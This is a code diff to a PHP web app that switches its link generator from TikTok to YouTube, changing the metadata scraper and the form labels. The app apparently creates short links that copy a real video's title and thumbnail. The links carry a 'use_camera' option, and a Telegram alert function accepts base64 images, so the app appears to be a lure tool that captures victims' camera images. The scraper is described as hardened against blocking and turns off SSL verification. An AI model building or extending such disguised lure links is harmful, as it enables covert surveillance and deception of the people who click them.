@@ -116,12 +116,13 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// 🛡️ دالة جلب البيانات القوية جداً (محصنة ضد الحظر)
-function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
+// 🛡️ دالة جلب بيانات يوتيوب (محصنة ضد الحظر)
+function fetch_video_meta($url) {
+    $meta = ['title' => 'فيديو يوتيوب', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
     
-    // 1. المحاولة عبر oEmbed (أفضل طريقة)
-    $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
+    // 1. المحاولة عبر YouTube oEmbed API (أفضل وأسرع طريقة)
+    $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
+    $ch = curl_init($oembed_url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4,
         CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -130,41 +131,32 @@ function fetch_tiktok_exclusive_meta($url) {
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            $title = $data['title'];
-            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
-            return ['title' => $title, 'image' => $data['thumbnail_url']];
+            return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
         }
     }
     
-    // 2. المحاولة عبر قراءة الصفحة (Fallback)
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
-        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
-    ]);
-    $html = curl_exec($ch); curl_close($ch);
+    // 2. المحاولة الاحتياطية: استخراج ID الفيديو وجلب أقصى دقة للصورة
+    $video_id = '';
+    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
+        $video_id = $matches[1];
+    }
     
-    if ($html) {
-        // جلب الصورة (نفضل og:image)
-        if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
-            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
-        } elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
-            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
-        }
-
-        // جلب العنوان
-        if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
-            $title = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-            if (stripos($title, 'Make Your Day') !== false) {
-                if (preg_match('/"desc":"([^"]+)"/', $html, $desc_match)) {
-                    $title = html_entity_decode(stripslashes($desc_match[1]), ENT_QUOTES, 'UTF-8');
-                }
+    if ($video_id) {
+        $meta['image'] = "https://img.youtube.com/vi/{$video_id}/maxresdefault.jpg";
+        
+        // محاولة جلب العنوان من الصفحة كخطوة أخيرة
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, 
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ]);
+        $html = curl_exec($ch); curl_close($ch);
+        
+        if ($html) {
+            if (preg_match('/<title>(.*?)<\/title>/', $html, $title_matches)) {
+                $meta['title'] = html_entity_decode(str_replace(' - YouTube', '', $title_matches[1]), ENT_QUOTES, 'UTF-8');
             }
-            $meta['title'] = (stripos($title, 'TikTok') === false) ? 'TikTok - ' . $title : $title;
-        } elseif (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
-            $title = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
-            $meta['title'] = 'TikTok - ' . $title;
         }
     }
     return $meta;
@@ -464,7 +456,7 @@ if ($is_logged_in) {
         $target_url = trim($_POST['target_url']); $link_name = trim($_POST['link_name']);
         $use_camera = isset($_POST['use_camera']) ? 1 : 0;
         if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
-        $scraped = fetch_tiktok_exclusive_meta($target_url);
+        $scraped = fetch_video_meta($target_url);
         $code = substr(md5(uniqid(rand(), true)), 0, 7);
         $db->prepare("INSERT INTO links (user_id, name, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $link_name, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
         $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
@@ -650,14 +642,14 @@ if ($is_logged_in) {
                 </div>
 
                 <div class="card" style="border-color: var(--accent);">
-                    <div class="card-title">🔗 إنشاء رابط تيك توك جديد</div>
+                    <div class="card-title">🔗 إنشاء رابط يوتيوب جديد</div>
                     <form method="POST">
                         <div class="form-group">
                             <label>اسم الرابط</label>
                             <input type="text" name="link_name" required>
                         </div>
                         <div class="form-group">
-                            <label>رابط فيديو تيك توك</label>
+                            <label>رابط فيديو يوتيوب</label>
                             <input type="text" name="target_url" required>
                         </div>
                         <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
